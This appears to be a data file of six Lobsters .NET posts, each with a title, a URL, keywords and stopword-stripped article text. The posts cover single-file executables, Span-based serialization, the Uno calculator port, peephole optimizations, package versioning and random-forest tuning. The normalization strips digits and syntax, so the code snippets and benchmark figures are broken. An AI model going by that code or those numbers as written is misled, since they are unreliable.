130,Lobsters,dotnet,"C#, F#, .NET programming",Creating Trimmed Self Contained Executables in .NET Core,https://dev.to/jeremycmorgan/creating-trimmed-self-contained-executables-in-net-core-4m08,creating trimmed self contained executables net core,net core publishing net core framework dependent deployment self contained deployment framework dependent executables new feature self contained executables prerequisite net core linux conclusion net core iq beat click try,going show cool new feature net core let say want create simple lean executable build drop server example create console app open line text read display output first let create new net core app scaffold new console application run look something like mac nt matter long development box net core cli installed display hello world console let create file called testtxt file line whatever nt matter put long text next create something read line display remove hello world code replace string line systemiofilereadalllines testtxt foreach string line line consolewriteline line consolewriteline press key exit systemconsolereadkey pretty much basic cookie cutter code opening file reading string array loop array line line print line exit pretty simple stuff run machine look like great mac want run window machine linux problem net core right publish multiple target net core nt installed machine want simple executable run read file without pile file net core installed publishing net core let back little net core publishing profile long time idea behind target publishing one biggest selling point platform build app publish specific target window osx linux publish different way framework dependent deployment mean relies shared version net core installed computerserver self contained deployment nt rely net core installed server component included package ton file usually framework dependent executables similar framework dependent deployment creates executables platform specific require net core library ok cool new feature going show well self contained deployment cool nt need runtime installed end looking something like application built published self contained deployment window yikes let say wanted share file reader application asking someone copy file folder run something read text file silly new feature self contained executables build self contained executable ran following command dotnet publish c release r look pretty familiar done net core cool new feature dotnet publish r c release p publishsinglefiletrue using flag build something little different much better single exe pdb look info super small includes net core runtime well another cool feature dotnet publish r c release p publishsinglefiletrue p publishtrimmedtrue example nt change size large complex application lot library publish single file get huge adding publishtrimmed flag extract library need run application copy file window machine nice small package run work without net core change target dotnet publish r c release p publishsinglefiletrue p publishtrimmedtrue run linux server without net core easily remember linux machine wo nt need net core runtime need prerequisite net core linux installed conclusion cool feature net core want build trimmed selfcontained executables platform easily couple flag great stupid simple thing console apps data reader microservices whatever want build drop machine hassle thought cool feature show net core iq aspnet core skill iq bad beat click try
132,Lobsters,dotnet,"C#, F#, .NET programming",Custom Binary Serialization in C#,https://jbp.dev/blog/custom-binary-serialization.html,custom binary serialization c,custom binary serialization c plenty way binary serialization marshal class sizeof difference two method corefx source deep jit interface zeroformatter github third article binaryformatter streamextensionscs,custom binary serialization c updated plenty way serialize data c going explore one binary serialization instead using net library going roll fun afterwards performance testing see stack article trying write directly memory location structs primitive avoiding extra copying allocation call stack depth hopefully serialize data faster use new c feature library traditional way write struct stream use marshal class structuretoptr sizeof create new byte get passed streamwrite object large lot performance resource usage negatively affected first credit others helped refine code thanks suggestion able convert unsafe form new safe version net core added new overload streamwrite readonlyspan byte bypass creating byte converting struct simply point existing struct trick stream thinking collection byte trickery span byte made point inplace existing struct main hurdle nt start byte use span constructor two option explain use different tradeoff involved systemruntimecompilerservicesunsafe aspointer method convert struct use constructor span void require length get unmanaged constraint use sizeof operator type also constraint aspointer need anyways public static unsafe void write stream stream value unmanaged var pointer unsafeaspointer ref value var span new span byte pointer sizeof streamwrite span memorymarshalcreatespan memorymarshalasbytes avoid unsafe context potential memory issue public static void write stream stream value unmanaged var tspan memorymarshalcreatespan ref value var span memorymarshalasbytes tspan streamwrite span two option save one allocation reading final memory location avoid copy operation using intermediate byte unsafe public static unsafe read stream stream unmanaged var result default var pointer unsafeaspointer ref result var span new span byte pointer sizeof streamread span return result safe public static read stream stream unmanaged var result default var tspan memorymarshalcreatespan ref result var span memorymarshalasbytes tspan streamread span return result difference two method suprisingly memorymarshal actually us systemruntimecompilerservicesunsafe behind scene corefx source big difference generic constraint struct unmanaged like code make sure runtimehelpersisreferenceorcontainsreferences false found code deep jit interface bool getilintrinsicimplementationforruntimehelpers methoddesc ftn corinfomethodinfo methinfo methodtable isvaluetype methodtable containspointers methinfo ilcode constcast byte returntrue else methinfo ilcode constcast byte returnfalse typeisvaluetype call issubclassof small method problem executing quickly containspointers flag check c code equally speedy first call isreferenceorcontainsreferences fairly cheap jit compiler may able optimize afterwards ran benchmark time first run excluded warm profiler median kept result checked make sure weird outlier data everything look good raw data care run generated graph svg already minified nt keep copy original result similar though bit faster case going blame corporate antivirus person zeroformatter serialize m deserialize m binary size b safeformatter serialize m deserialize m binary size b unsafeformatter serialize m deserialize m binary size b person zeroformatter serialize m deserialize m binary size kb safeformatter serialize m deserialize m binary size kb unsafeformatter serialize m deserialize m binary size kb int zeroformatter serialize m deserialize m binary size b safeformatter serialize m deserialize m binary size b unsafeformatter serialize m deserialize m binary size b zeroformatter serialize m deserialize m binary size b safeformatter serialize m deserialize m binary size b unsafeformatter serialize m deserialize m binary size b string zeroformatter serialize m deserialize m binary size kb safeformatter serialize m deserialize m binary size kb unsafeformatter serialize m deserialize m binary size kb zeroformatter serialize m deserialize m binary size kb safeformatter serialize m deserialize m binary size kb unsafeformatter serialize m deserialize m binary size kb two method neck neck look like safe version teeny bit faster small consider observational error therefore would stick safe version glad tested adapting benchmark used zeroformatter compare custom serialization method scenario exactly fair test usage handcoded zeroformatter use reflection code found github legend zeroformattercustomwinner per category byte kb person byte byte kb byte predicted serializer excellent performance struct case lose time guessing case person person encoding add lot overhead avoid remove code use prebuilt method reading string stream note memory footprint string essentially double public static string readstring stream stream var length streamread int return stringcreate length stream char streamtouse var byte memorymarshalasbytes char streamtouseread byte resulting time go lot string go m deserializing m serializing m m respectively person also see improvement drastic make faster zeroformatter data structure storing dawg third article series going use test new method zeroformatter well net binaryformatter loaded typical dictionary consumes memory private readonly int terminalnodeindex private readonly int rootnodeindex private readonly int firstchildedgeindex length private readonly int edgestonodeindex length private readonly char edgecharacter length private readonly ushort reachableterminalnodes length private readonly long wordcount length initial warm avoid jit issue loaded object disk time method result custom binaryformatter zeroformatter win nt come surprise using handcoded serializer working specialty unmanaged array method rely reflection substantial burden advantage requiring le work setup size file also slightly different custom byte binaryformatter byte zeroformatter byte impressively binaryformatter close custom format size guessing slight difference storing type information larger size zeroformatter file almost assuredly converting char surprised nt output string matched size without span method nt feasible make write byte int int convert arbitrary type byte union nt quite right type size larger single byte length property much small stream method complain perform bound checking unsafe pointer wo nt either casting byte blow using bad thing var wrapper new unionarrayint typed value write wrappertyped wrapperbytes structlayout layoutkindexplicit public struct unionarrayint fieldoffset public readonly byte byte fieldoffset public int typed public void write value byte byte unmanaged var oldlength valuelength oldlength unsafe fixed typedpointer value var intpointer intptr typedpointer try intpointer new intptr sizeof oldlength streamwrite byte byteslength finally intpointer new intptr oldlength unfortunately write union struct type want use way nt able create generic container magic part intpointer using pointer edit length field array trick stream method accepting fake byte important note used intptr actual pointer representative word size processor otherwise bit use int targeting bit would require long relies memory layout array nt know kind guarantee expect always location truly example work pc mention requires endianness match end depends requirement serializing bit byte need speed great way otherwise existing serialization library make much easier write maintainable code missed link code streamextensionscs
133,Lobsters,dotnet,"C#, F#, .NET programming","A piece of Windows 10 is now running on WebAssembly, natively on iOS and Android",https://platform.uno/a-piece-of-windows-10-is-now-running-on-webassembly-natively-on-ios-and-android/,piece window running webassembly natively io android,month ago microsoft open sourced window calculator calculator ship window port c uno platform use today anatomy window calculator calculation engine date back porting engine uno platform challenge adjusing c calculation engine flexible array member feature io webassembly challenge native code interop specific required use additional ci build step automatically added emscripten challenge converting ccx code c challenge converting xaml challenge localization resource attached property syntax connecting c c together pinvoke challenge mono webassembly dynamic static linking support mono updated emscripten dynamic linking feature mono static linking feature challenge c adaptation layer c c translation layer create c instance passed thereafter explicitly challenge case c c callback need rely emscripten reserved function pointer challenge string marshalling explicit management string challenge adding feature uno platform rowdefinitionsmaxwithmaxheight support attached property localization using resource text measuring caching visualstate trigger javascript marshaling attribute additional note corsanywhere sample app c conversion final thought heading github repo created simple tutorial let u know think,month ago microsoft open sourced window calculator calculator ship window decided port c uno platform io android user could use also use web using webassembly well uno platform enable c xaml code run web mobile desktop video use today anatomy window calculator window calculator interesting notsosimple piece software simple initial ui see upon launch deceiving course good ux choice microsoft made us calculator rather simple one however calculator complex way coded year well advanced function first built entirely using standard c ccx calculation engine date back historically part c code actually built c second calculator contains feature standard mode scientific mode programmer mode multiple base conversion shifting operation interactive bit field view date calculator large set converter currency volume length temperature angle infinite precision arithmetic operation expression view parenthesis support history view selectable item editable memory view also boast responsive design windowed orientationaware device button history dynamic visibility localization language narratorvoiceover accessibility support clipboard support porting engine uno platform uno platform developed c able support calculator io android webassembly part code needed translated c others needed adjusted compliant clang c support following part dissect challenge needed solve order port code web via webassembly support uno platform well native io android apps challenge adjusing c calculation engine main reason keeping c code asis use pointer lowlevel memory technique map easily c also fact calculation engine use ui directly code encapsulated using calculatormanager class iresourceprovider callback interface icalcdisplay ui update callback interface part code need updated except use flexible array member feature feature supported c good reason microsoft engineer added exclusion feature clang however code relied needed adjustment use normal array build script used io webassembly generate native payload whereas window android use c visual studio project integration android ndk also surprise handling exception enabled default ndks abis calculation engine relies use exception handle case division zero making app crash condition adding lunwind library linker solved issue challenge native code interop specific multiple subtlety building using native code io required use internal known name native library statically linked main executable android integrated v project automatically build target platform mean additional ci build step executed proper binary used creating final apk also standard project dependency used multi abi build androidnativelibrary item must added project webassembly module need built using support additional support c standard library automatically added emscripten dynamic module challenge converting ccx code c rest application using microsoft ccx use winrt apis particularly winui apis make c like code converted c using set regular expression convert dynamiccast frameworkelement fe frameworkelement fe rest winrt api call match directly uno platform provides full apis signature winrt conversion convert roughly ccx code c compatible code manual adjustment get fully functional c instance c iterators need converted foreach loop string number conversion using net builtin conversion part code could converted asis particularly relying apis current culture property like currency calendar feature needed converted use net apis much possible challenge converting xaml part easy nothing convert thing needed adjust uno platform difference missing support theme resource revealbrush support calculator interface layout also responsive adjust many break point enables multitasking docking scenario ipad easily challenge localization resource uno platform support use resw file mean file exact file original calculator us note resource use attached property syntax narrator tooltip support data name memorypivotitem using windowsuixamlautomation automationpropertiesname xml space preserve value arbeitsspeicher value comment automation name memory pivot item shown calculator wide layout comment data making clutterfree localized xaml image asset also supported directly uno platform though original asset used directly use semantic feature high contrast yet supported uno platform excluded time connecting c c together part heart porting effort make use pinvoke challenge mono webassembly dynamic static linking support able invoke webassembly code directly c using pinvoke mono updated support two mode available one interpreterbased build another aotbased build interpreterbased mode us emscripten dynamic linking feature required ble build wasm application window without rely emscripten tooling ensures development loop efficient possible though expense runtime performance aotbased mode us emscripten mono static linking feature mono generates set known pinvoke method llrm bitcode module mode efficient also slowest generate generally best use release ci build challenge c adaptation layer pinvoke able call c function exposed extern c cdecl calling convention mean able invoke c part calculation engine c c translation layer needed created expose set method create c instance return opaque identifier passed thereafter explicitlyto c class instance method technique requires manual work since calculation engine particularly complex adding needed method easy work challenge case c c callback callback generally handled c via marshalgetfunctionpointerfordelegates work well jitcompatible platform android window creation stub trampoline runtime io webassembly support io unmanagedfuntionpointer need added callback pointer generated compile time monowasm yet support feature need rely emscripten reserved function pointer addfunction helper function get webassembly invocable callback c javascript registered function call back c using mono binding helper challenge string marshalling string marshalling tricky piece window system use encoding nix system use encoding default pinvoke marshalling support implicit conversion explicit management string needed added support c wchart type challenge adding feature uno platform course porting calculator add support many xaml winrt feature caculator relying feature grid rowdefinitionsmaxwithmaxheight support attached property localization using resource fix text measuring caching webassembly performance improvement visualstate trigger javascript marshaling support new x load attribute improvement made uno platform adjustment made original source code calculator adjust uno platform going adding support future progressively add new feature uno platform additional note currency converter us api call able get uptodate rate endpoint corsenabled make invocation web browser difficult api call going corsanywhere sample app eventually microsoft may updating endpoint support properly also trying calculator wasmrelated apps webassembly limitation keep following mind webassembly work progress performance getting better better emscripten llvm mono uno platform get improvement lot devs use chrome primary browser currently chrome support webassembly quite current canary much better may want try calculator using one browser c conversion translating c c useful understand code make familiar general population window developer disadvantage making change tracking original source code harder reason chose refactor little possible code eg adjustment conform c general naming convention keep c code close original c code possible eas process applying upstream c update c code base final thought porting calculator interesting project work also make good calculator use platform try building heading github repo like help developer write singlecodebase application run natively web mobile desktop help created simple tutorial test environment appreciate give try let u know think special thanks team nventive hard work making porting application reality
134,Lobsters,dotnet,"C#, F#, .NET programming",Peephole optimizations in C++ and C#,https://egorbo.com/peephole-optimizations.html,peephole optimization c c,proebsting law piece code llvm piece dsl egorbocoreclr godboltorg opt godboltorg optimization v specification dotnetcoreclr machinedependent optimization dotnetcoreclr dotnetcoreclr trap optimization future direction optimizing compiler really need optimization c tweet replacing c c modern c lamentation object stack allocation link,performance gain due improvement compiler optimization double speed program every year proebsting law solve equation try simplify first eg x simplified x modern compiler called peephole optimization roughly speaking compiler search certain pattern replace corresponding simplified expression blog post list found llvm gcc net core coreclr source let start simple case x x x x x x x z z z x check one c c compiler int test int x int int z return x z z z x let take look compiler output test int int int mov eax edi sub eax esi imul eax edx ret c clang gcc msvc ctest mov eax edx imul eax imul sub eax ret c ryujit three c compiler one imul instruction c net core two limited set available peephole optimization list later sure note entire instcombine transformation implementation peephole optimization live llvm take line code loc dagcombinercpp way piece code llvm responsible pattern inspecting gcc special dsl describes peephole optimization piece dsl case decided blog post try implement optimization c jit hold beer let test jit improvement see egorbocoreclr commit detail disasmo lea imul instead imul imul add let go back c trace optimization clang need ask clang emit llvm ir c code via emitllvm flag see godboltorg give llvm optimizer opt via printbeforeall printafterall flag order find transformation actually remove extra multiplication set see godboltorg ir dump combine redundant instruction define dsolocal mul nsw mul nsw sub nsw ret ir dump combine redundant instruction define dsolocal sub mul ret instcombine instcombine indeed even use optimization code test via instcombine flag passed opt let go back example look cute optimization found gcc source x c x false c odd true eg odd number c c usually mean constantliteral always false expression int x always return false llvm nt optimization optimization v lot type optimization work different data type eg byte int unsigned float latter bit tricky eg simplify b b floatsdoubles even b c equal b c due specification however c compiler special flag let optimizers le strict around nan fp corner case apply optimization usually called fast math ffastmath clang gcc fp fast msvc btw find feature request net core introduce fast math mode dotnetcoreclr see two vsubss eliminated ffastmath mode c optimizers also support mathh function eg ab x ab x x x square root always positive sqrt x false negative sqrt x false calculate sqrt x calculate compile time instead sqrt x c x c c sqrt optimization sqrt x sqrt x sqrt x sqrt x x sqrt x sqrt sqrt x logn sqrt x logn x exp exp x exp exp x favorite one sin x co x tan x lot boring bitbool pattern b b b b b b b x x x b b x equal x b b true hundred machinedependent optimization operation may faster slower different cpu eg mulssmulsd usually better latency throughput divssdivsd example spec intel haswell cpu replace c even non fast math mode c power two btw pr net core optimization dotnetcoreclr rationale test better cmp see pr dotnetcoreclr detail x x x x x x x x think one pow x sqrt x pow x sqrt sqrt x pow x x x mul pow x x x x mul many mul needed perform pow x x x x x like pow x unlike pow x even use register modern cpu support special fma instruction perform mul add one step without intermediate rounding operation mul x z fmadd x z sometimes compiler able replace entire algorithm one cpu instruction eg trap optimization find pattern optimize risk break code always cornercases hidden sideeffects llvm bugzilla contains lot instcombine bug expression part want simplify might used somewhere else borrowed nice example second issue future direction optimizing compiler article imagine function int int int b int na int nb b return na nb need perform operation b и na nb llvm simplifies two operation return b smart move ir define dsolocal add b sub ret imagine need store value na nb global variable eg x int x int int int b int na int nb b x na nb return na nb optimizer still recognizes pattern simplifies removing redundant point view b operation need save global variable thus lead define dsolocal sub nsw sub nsw b store x align tbaa store align tbaa add b sub ret math operation instead optimizer made code bit slower let see c ruyjit generates case ruyjit optimization code contains operation c faster c p really need optimization well never know final code look like inlining constant folding copy propagation cse etc also llvm ir net il tied specific programming language rely quality ir generates run applib instcombine pas measure performance impact c said earlier peephole optimization limited c moment however say c mean popular c runtime coreclr ruyjit including using llvm backend mono see tweet unity burst lillc runtimes basically use exactly optimization clang unity guy even considering replacing c c internal part way since net include mono optional builtin runtime able use llvm power case back coreclr peephole optimization managed find morphcpp comment sure x x x x x x x x arm x x x x x x x x x x x x also loweringcpp machinedependent one general ryujit obviously loses с compiler ryujit focus different thing lot requirement main one compile fast called jit well unlike c compiler see modern c lamentation also important devirtualize call optimize boxing heap allocation eg object stack allocation however since ryujit supporting tier know maybe place peephole optimization future even separate maybe sort dsl declare read article prathamesh kulkarni managed declare optimization gcc line dsl simplify plus mult sin sin mult co co flagunsafemathoptimizations buildonecst treetype following pattern x x equal link
135,Lobsters,dotnet,"C#, F#, .NET programming",Versioning limitations in .NET,https://codeblog.jonskeet.uk/2019/06/30/versioning-limitations-in-net/,versioning limitation net,available github refresher semver semantic versioning set rule diamond dependency problem version version sample code nonproposals ignore problem build head globally c live head language abseil project never make breaking change library proposal prerequisite multiversion support small demo proposal execute expected major version proposal private dependency extern alias package github issue dragon shared state unknown dragon conclusion like,blog post intended write long time blog post category include recipe tiramisu ice cream knight ally one thing grown mind time becoming harder harder start however three recent incident brought back focus tl dr versioning inherently hard way net infrastructure set make harder need suspect sample code blog post available github refresher semver nuget de facto standard distribution package support semantic versioning also known semver short semver version string ignoring prerelease version form majorminorpatch rule semver sound straightforward perspective package producer make breaking change need bump major version make backward compatible addition need bump minor version make backward forward compatible change basically internal implementation change documentation change bump patch version also sound straightforward perspective package consumer considering moving one version another package move different major version existing code may work everything change major version move later minor version within major version code still work move earlier minor version within major version existing code may work may using something introduced latest minor version move later earlier patch version within majorminor version code still work thing quite clear sound though count breaking change kind bug fix go patch version change detected break someone theory least net core team set rule considered breaking set rule may appropriate every project love see tooling tell kind change made two commits standard format rule tool first bullet suggest next version number project advertise following rule standard format record kind change made version tooling check probable compatibility new version library consuming given codebase record change place would hopefully able follow semver reliably importantly make version number purely technical decision marketing one current version package say add bunch feature backwardcompatible way release new version even major version term work put use whatever mean communicate marketing message keep version number technical even package follow semver predictably clearly enough peace harmony net ecosystem unfortunately diamond dependency problem diamond dependency problem new net time manage ignore still real likely become issue time canonical example diamond dependency application depends two library depends common third library like using nodatime example refer specific version moment actually need complicated need need two dependency library one application multiple dependency library fine long depend compatible version example discussion semver fine depend nodatime app depend nodatime expect tooling resolve dependency determine version use app code fine meant backwardcompatible true way round app depends later version long using major version note potential problem even within minor version number app depends depends contains bug fix app workaround bug fails bug longer present thing like definitely happen ignore kind problem rest post assume everything conforms idealized semver diamond dependency become problem semver dependency two different major version library give concrete example nodatime package consider iclock interface version contains single property version functionality method getcurrentinstant basically design failing part followed bcl example datetimenow without thinking clearly enough whether property suppose app built net core sdk depends nodatime depends nodatime let imagine world breaking change nodatime build application expect used execution time never call iclocknow well net core tooling assembly binding redirects handled automatically request nodatime get nodatime precise way done depends runtime executing application net core appdepsjson file desktop net appexeconfig fortunately matter much level blog post may well make big difference viable future though call iclocknow runtime throw missingmethodexception ouch sample code upshot transitive set package version tuples entire application contains one major version package entirely possible get exception execution time missingmethodexception missingfieldexception typenotfoundexception similar sound likely please consider newtonsoftjson package json net major version writing blog post suspect james newtonking kept breaking change absolute minimum even pretty scary nonproposals like propose enhancement tooling might help address issue look suggesting like mention option suggesting ignore problem surprised people seem worried versioning presented talk versioning couple time remember seeing anyone else certainly netspecific deepdive way talk either possible lot people worried quiet blog post part trying agitate community including limited microsoft taking problem seriously turn already smart people working great also possible live edge versioning anarchy forever always potential nightmare cause small enough number failure decide live feel like risk least take consciously though build head globally titus winter presented c live head language cppcon great talk go watch yes hour half long still worth also state bunch said slightly different way may helpful sense idea everyone build application based full source code provide tooling automatically update consumer code based library change go back noda time iclock example build code application locally app nodatime nodatime change iclocknow property iclockgetcurrentinstant code us iclocknow automatically changed use iclockgetcurrentinstant everyone happy version abseil project library collection library c embrace concept possible could eventually good solution net know technical aspect mean could work c net however far current position believe practical choice moment think make sense try experiment one language first year let language consider whether make sense want make clear disagreeing anything titus said smart guy explicitly agree almost everything heard say ever decide disagree aspect want make public debate lot specific vague argument irritating everyone net ecosystem depend binary distribution package moment environment titus deliberately try address someone want think practical implication world net consumer living head sourcedriven rather binarydriven world interested reading result thinking certainly feasible net core going right never make breaking change library never make change break anyone none problem gave example newtonsoftjson earlier major version guess mean really set breaking change sufficiently unlikely cause real failure survived nodatime package know made real breaking change currently version planning release time c come made considering breaking change least three different way adding member public interface implement interface relatively unlikely code broken hand everyone want functionality added get use clean way removing functionality either longer desirable binary serialization present start still want functionality recommend stay old version refactoring existing functionality eg iclocknow iclockgetcurrentinstant change fixing typo method name annoying existing consumer better future consumer want able make change good thing long run believe option want take let look think pursue proposal firstly well done thank making far editing word post point smarter person might got far quicker without loss important information hope background useful prerequisite multiversion support proposal require runtime support loading multiple assembly name time obviously want support net core require use multiple appdomains far aware already case small demo running target call systemclockinstancenow nodatime string pathgetfullpath assembly assemblyloadfile dynamic gettype nodatimesystemclock instance field getfield instance getvalue null consolewriteline call systemclockinstancegetcurrentinstant nodatime string pathgetfullpath assembly assemblyloadfile dynamic gettype nodatimesystemclock instance property getproperty instance getvalue null consolewriteline used dynamic typing avoid call property getcurrentinstant method using handwritten reflection obtain clock reflection accessed via static member project depend noda time compiletime sense possible introducing compiletime dependency could lead interesting problem suspect fixable rest work brief inspection look like also possible load two independent copy version assembly long stored different file may important later see proposal execute expected major version first part proposal underlies rest ensure library end executing dependency version major version requested depends noda time tooling make sure always get appears default moment mind much explicit main point different dependency require different major version result need multiple assembly present execution time rather either build error approach let hope use anything removed course able declare compatible nodatime nodatime would good make ease validate rest application already depends nodatime example fine stick simple situation loading single copy nodatime assembly rest application using depends make work loading major version proposal lead problem term library communicate remaining proposal attempt address proposal private dependency describing diamond dependency problem one aspect go sometimes library take dependency pure implementation detail example could use nodatime internally expose api purely term datetime hand could expose use nodatime via public protected api using nodatime type property method parameter method return type generic type argument base type scenario entirely reasonable different versioning concern us nodatime private dependency app ideal world need care version nodatime us however expose method iclock parameter method caller really need know using need iclock pas mean app need aware version nodatime depends propose author able make decision whether nodatime public private dependency express decision within nuget package compiler able validate private dependency really exposed public api anywhere ideally like part c language eventually think versioning important enough language concern reasonable assert ship sailed however reasonable roslyn analyzer careful thought required term transitive dependency way compileranalyzer treat situation privately depends nodatime publicly depends publicly depends nodatime confess thought detail first want get enough people interested detailed work worth extern alias package private dependency relatively simple think believe implementation detail modulo bunch caveat impact consumer library private dependency public dependency trickier app want use nodatime almost everything need pas clock method app effectively need depend currently far aware way representing project file c language support idea multiple assembly exposing type via extern missing way expressing project file already github issue requesting know alone wanting might something like projectreference include nodatime version externalias projectreference include nodatime version externalias c code might use using nodatime use nodatime type normal using nodatime pas clock method nodatimesystemclockinstance assumption package contains single assembly definitely true full solution would probably need address allowing complex syntax perassembly aliasing worth noting would feasible library author providing bridging package example could provide nodatimebridging package allowed convert nodatime nodatime type sometimes conversion may lossy least feasible visible immutability almost every type noda time big help admittedly package like could really help consumer dragon shared state far thought two significant problem proposal involve shared state opposite direction firstly consider singleton really want singleton systemclockinstance singleton noda time multiple assembly loaded one per major version really singleton per major version systemclock fine imagine library decided would use grab processwide resource singleton assuming okay one maybe id generator would guarantee uniqueness incrementing counter work multiple instance secondly need consider mutable shared state sort service locator code registered implementation two different library supposedly private dependency service locator package might want register type service locator point thing work fine depend different major version service locator package start conflict implementation happen depend major version end using assembly isolation private dependency isolated reasonable argue avoid sort shared state far possible unreasonable assume exist considered part kind versioning proposal least need consider user diagnose issue stemming ease even suspect always slightly tricky noted earlier possible introduce isolation loading assembly multiple time potentially private dependency could really private help second case hurt first case also performance impact term duplication code etc unknown dragon aware versioning really complicated probably thought developer know lot unaware expect proposal ready go without serious amount detailed analysis work would like help work suspect mostly done others suspect even detailed analysis enough get thing right expect prototype exposing real world dependency find bunch issue conclusion believe net ecosystem versioning problem currently recognized addressed intention proposal final concrete design doc intention help either start ball rolling give alreadyrollingslightly ball little momentum want community openly discus problem seeing get better handle problem work together alleviate problem best recognizing perfection unlikely possible like like loading related
136,Lobsters,dotnet,"C#, F#, .NET programming","How we sped up random forest processing, lots of common performance patterns",http://cultureofdevelopment.com/blog/how-we-sped-up-random-forest-processing-lots-of-common-performance-patterns/,sped random forest processing lot common performance pattern,previous article lambda function tax array class shrinking representation major edit awesome visitor post fast access root tree next repo sped random forest process series comment powered disqus,previous article outlined problem major constraint must adhere wrote straightforward implementation random forest evaluator proved correctness implementation set naive benchmark test much time going take run sample tree maximum depth decision node currently run m need run m quick reminder condensed version code previous article ignoring boilerplate sealed class decisiontree public class decisiontreenode public int featureindex get set public double value get set public int truebranch get set public int falsebranch get set private readonly decisiontreenode node public double evaluate double feature var node node nodefeatureindex int nodeindex feature nodefeatureindex nodevalue nodetruebranch nodefalsebranch node node nodeindex return nodevalue public sealed class randomforest private readonly decisiontree tree public double evaluateprobability double instance var sum treessum tevaluate instance return mathexp sum correctness standpoint code fine correctness test performance standpoint however still way go line code incredible amount common performance related issue address let take look lambda function tax linq amazing technology allows write extremely expressive code using declarative syntax want sum result calling function every element array one liner read almost like english sentence used describe wonderful tool drawback workperforming argument nearly every linq operation function careful function use argument might leaving fair amount performance lying floor usually example line function argument passed lambda function lambda function executed run context declared meaning access variable scope able use instance argument local variable evaluateprobability function without declaring instance variable lambda creating context lambda function relatively expensive task wo nt notice ever generate context particular lambda tax start add case time per request way solve problem straightforward method either nt use lambda function delegate parameter linq function necessary nt use linq case need context order get instance variable fix nt really option get rid use linq double evaluateprobability double instance var sum int treeslength sum tree evaluate instance return mathexp sum simple enough little harder read go sometimes let see kind effect timing time taken evaluation m reduction time nothing shake stick let really clear kind optimization matter user visit site need perform calculation roughly job peak hour going handling roughly request per second code get called lot happening per request would nt worry kind optimization time per second nt much code called time per second hour end lambda tax add fast array class net class reference type structs value type class usually larger data structure term maximum possible byte used null structs usually smaller null passing value type function setting new variable value type full copy made reference type reference copied creating array reference type stored array reference value type stored directly array order access data reference type first go memory location reference need data value type hand point directly memory location data stored best describe picture array class array contains reference memory location want access need go look memory location use data class instead switch class struct end situation second part image case avoid extra lookup gain performance code perspective change seems trivial class decisiontreenode public struct decisiontreenode nt go switching class structs yet however lot concern consider deciding entity class struct plenty place internet find good discussion topic instance respresentation entity intended exposed beyond library give u lot freedom around design optimize performance assumption going expose randomforest class api decisiontree use technique decisiontree class struct well wo nt see nearly large speedup however accessing tree many fewer time node still pay price lookup node array reference time taken evaluation m holy cow extra lookup appear quite impactful total reduction time still shaking stick last one see argument one look crazy put stick thing note change part performance win come way property handled class versus structs structs inherited call function get value property sure function exactly need called since class inherited function overridden actual function need get called looked based type class pushed reference two different implementation base class still correct function get called even holding reference base class actual implementation case property simply wrapper field explicitly eliminate getter call making field instead property compiling optimization default release build jit appears smart enough inline property call anyway nt need worry lastly since structs null point function call checking instance null save additional work shrinking representation ton tree exact node tree node ints double practice total tree node full model one using byte total size mb given request run job end lot churn since really change feature representation without changing model look reduce size tree order reduce memory churn bit exaggeration going touch node average single evaluation based path taken tree point bit crossroad design process solution shrink representation time effectively making implementation le le general tool moving direction trying solve specific model given u case long way go right performance quest let go full specific model get goal get goal back try make general purpose decision made considering care specific model know feature need short store possible feature index also know tree contains node branch need size individual byte lastly long verification test pass willing accept size reduction value representation well let try float instead double struct decisiontreenode public short featureindex public float value public byte truebranch public byte falsebranch time taken evaluation m correctness verified total byte per node full model size went mb kb look like good go correctness take shaved another m bringing u total time reduction hold one issue really need address made prominent last change want access data type byte wide value case efficient align memory address divisible lot nuance around beyond scope discussion problem pop really bad basically guaranteeing alignment changing featureindex int byte short byte forcing full size decisiontreenode exactly byte ask memory memory allocator aware aligned memory performant give memory starting aligned address case featureindex accessible aligned address however value byte length since full data structure exactly byte array structs pretty much bad spot alignment issue mean fair bit expensive load non aligned value luckily fix really simple swap order field class definition struct decisiontreenode public float value public short featureindex public byte truebranch public byte falsebranch time taken evaluation m go better alignment byte data type better performance total improvement far major edit awesome visitor post pointed performance bump due better alignment byte value instead due better cache alignment mean exactly c compiler attempt help exact issue described add padding struct order guarantee alignment byte value thought reduced byte structure byte fact shrunk byte reordering field eliminated need padding achieved actual byte struct size result better cache access account majority performance bump fast access root tree last one bit hack spent bunch time squeezing chunk performance tree node get used ton let take step back see speed dealing whole tree matter going pay lookup price node array however add field tree copy first node effectively first node right next reference array tree essentially time get reference node also get full root node tree available start processing first iteration loop happens background prefetch first page memory containing node really magic discus depth fourth installment series noted work tree node struct therefore life right line memory reference first array node decisiontreenode class would work would store reference exact memory location front array node would still eat latency extra lookup also would work work loop evaluate method tight loop instruction lot work get option hide latency memory lookup pulling useful information time load reference tree time taken evaluation m another m bite dust bringing u grand total reduction time shabby literally changing implementation detail without altering overall approach within factor need factor good day work pattern exploited far last one expect end using least basically hack decided include really highlight impact optimizing memory access latency getting work wait array memory load able shave time something already getting pretty fast point firmly land microoptimizations scale thing like dramatic impact let take look struct decisiontree public struct decisiontreenode public float value public short featureindex public byte truebranch public byte falsebranch private readonly decisiontreenode node private readonly decisiontreenode root public double evaluate double feature var node root nodefeatureindex int nodeindex feature nodefeatureindex nodevalue nodetruebranch nodefalsebranch node node nodeindex return nodevalue public sealed class randomforest private readonly decisiontree tree public double evaluateprobability double instance var sum int treeslength sum tree evaluate instance return mathexp sum looking difference even amazed performance difference code compared started top modify approach take advantage knowledge happening hood hopefully start recognize common pattern work remember blog post showing cadence meeting presenting performance improvement something run hundred time per second always fun experience next run common pattern exploit time start pulling tool help identify slow part next time run tool helped u identify remaining bottleneck code interested following along trying stuff please clone repo run naive test shown readme sped random forest process series please enable javascript view comment powered disqus
